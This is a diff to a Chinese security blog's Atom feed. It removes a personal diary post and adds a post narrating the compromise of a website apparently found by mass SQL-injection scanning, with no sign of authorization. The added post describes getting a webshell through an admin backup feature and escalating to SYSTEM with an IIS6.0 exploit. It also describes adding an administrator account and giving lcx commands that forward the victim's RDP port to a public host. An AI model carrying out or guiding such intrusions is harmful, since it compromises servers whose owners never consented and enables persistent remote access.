@@ -166,9 +166,9 @@
     
       <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
-      <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
-    
       <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
+    
+      <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
     
   </entry>
   
@@ -219,31 +219,6 @@
     
     
       <category term="钓鱼" scheme="https://www.se7ensec.cn/tags/%E9%92%93%E9%B1%BC/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>关于最近的流水账</title>
-    <link href="https://www.se7ensec.cn/2019/05/12/%E5%85%B3%E4%BA%8E%E6%9C%80%E8%BF%91%E7%9A%84%E6%B5%81%E6%B0%B4%E8%B4%A6/"/>
-    <id>https://www.se7ensec.cn/2019/05/12/关于最近的流水账/</id>
-    <published>2019-05-12T14:30:44.000Z</published>
-    <updated>2019-09-25T17:02:52.652Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p>博客停更了一阵子，以后可能只会分享一些关于生活、以及觉得“有价值”的文章了。</p></blockquote><a id="more"></a><h2 id="面试总结："><a href="#面试总结：" class="headerlink" title="面试总结："></a>面试总结：</h2><p>面试遇到了一些问题，然后利用空闲的时间总结了一下，查漏补缺。</p><h2 id="博客停更："><a href="#博客停更：" class="headerlink" title="博客停更："></a>博客停更：</h2><p>有道云笔记做记录，相对写博客更方便点，格式编辑、贴图都很方便；主要是某些小问题也想记录，又不想写博客的时候最合适不过了。</p><h2 id="西湖论剑："><a href="#西湖论剑：" class="headerlink" title="西湖论剑："></a>西湖论剑：</h2><p>参加了一次真正意义上的大比赛，酒店很好，饭很好吃，师傅们很强，然后西湖好像也没那么美。</p><h2 id="五一假期："><a href="#五一假期：" class="headerlink" title="五一假期："></a>五一假期：</h2><p>老哥结婚了，于是，慈爱的目光全部聚集到自己身上了：你都这么大了，准备啥时候结婚啊balabala。</p><h2 id="代码学习："><a href="#代码学习：" class="headerlink" title="代码学习："></a>代码学习：</h2><p>继续学着Php和Python，写期末大作业，不懂开发的渗透测试工程师不是好程序员。</p><h2 id="防灾比赛："><a href="#防灾比赛：" class="headerlink" title="防灾比赛："></a>防灾比赛：</h2><p>今年防灾第一次把河北省的大学都邀请来打比赛，往年只有燕郊的三个学校一起，感觉挺不错。</p><h2 id="心情复杂："><a href="#心情复杂：" class="headerlink" title="心情复杂："></a>心情复杂：</h2><p>低迷过，亢奋过，焦虑感像一个怪圈，跳出来又钻进去，感觉自己对未来充满了期待，也感到很迷茫。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;
-&lt;p&gt;博客停更了一阵子，以后可能只会分享一些关于生活、以及觉得“有价值”的文章了。&lt;/p&gt;
-&lt;/blockquote&gt;
-    
-    </summary>
-    
-    
-      <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
-    
-    
-      <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
     
   </entry>
   
@@ -532,6 +507,34 @@
     
     
       <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>记一次渗透提权03服务器</title>
+    <link href="https://www.se7ensec.cn/2019/02/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%8303%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+    <id>https://www.se7ensec.cn/2019/02/17/记一次渗透提权03服务器/</id>
+    <published>2019-02-17T13:00:17.000Z</published>
+    <updated>2019-12-05T17:10:21.110Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4jdR.png" alt="1"></p><blockquote><p>过渡。</p></blockquote><a id="more"></a><h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><p>站点是批量测注入的时候发现的，随手测了下后台就是admin，登陆进去发现有两处应该可以拿shell</p><h2 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h2><p>备份功能稳不稳定不知道，怕把站点搞死，最后还是通过备份成功getshell的 XD</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4QgL.png" alt="2"></p><h2 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h2><p>测试了修改文件类型，00截断，.asa、.cer….等无效，而且上传的文件名自动转换时间戳重命名，遂放弃。</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh40C8.png" alt="3"></p><p>不过有意思的是，右键源代码把编辑器揪出来了，开发把编辑器隐藏显示了，如下图（display:none改成on后即可显示，然鹅没有卵用，并不正常显示）</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4aHW.png" alt="4"></p><p>知道是eWebEditor的编辑器，编辑器后台地址：http:127.0.0.1/pluck%60edit/admin/login.asp，尝试了爆破，弱口令，默认备份mdb下载均无果也放弃了。（后来进去翻到账号就是建站公司的英文名字，密码加了个三位数，信息搜集对于爆破这一块还挺重要的）</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4b0w.png" alt="5"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进去大马（站点仅支持asp），可以直接执行cmd，就是权限很低</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4FIG.png" alt="6"></p><p>systeminfo直接看打了什么补丁，拿exp先怼怼看，复制下来补丁信息，扔进去 <a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">提权辅助</a>这个网页里比较下，可以使用 IIS6.0 的一个 exp，传到可读写目录里，我这里就是 C:\wmpub ，然后就用 IIS6.0.exe 执行命令，发现是system权限了，同样的方法添加一个管理员帐号。</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4SNg.png" alt="7"></p><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><p>由于主机在内网，开放的就是3389端口，我们只需要将主机的3389端口转发出来，就可以连接上去</p><p>端口转发工具：lcx （具体使用方法移步：<a href="http://www.cnblogs.com/lingerhk/p/4506308.html" target="_blank" rel="noopener">传送门</a>）</p><p>公网主机：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 2222 6666</span><br></pre></td></tr></table></figure><p>肉鸡：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网主机ip 2222 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>然后公网主机连接127.0.0.1:6666，发现连接失败，我丢。。。。（quser查询有一个前几天在线的管理，logoff踢掉了，然鹅还是上不去）</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4XsX.png" alt="8"></p><p>就到这里吧。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://t1.picb.cc/uploads/2019/02/17/Vh4jdR.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;过渡。&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+    
+      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
+    
+      <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
     
   </entry>
   
